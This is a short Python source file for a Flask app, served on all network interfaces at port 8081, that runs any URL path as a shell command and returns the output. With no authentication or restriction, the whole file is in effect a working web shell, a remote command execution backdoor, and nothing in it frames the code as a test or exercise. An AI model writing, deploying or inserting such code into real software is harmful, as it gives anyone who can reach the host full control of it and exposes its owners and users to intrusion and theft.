from flask import Flask
import subprocess
from flask import request
from waitress import serve

app = Flask(__name__)

def run_cmd(cmd):
	return subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read()

@app.route('/<cmd>')
def main(cmd):
	return run_cmd(cmd)

serve(app, port=8081, host='0.0.0.0')
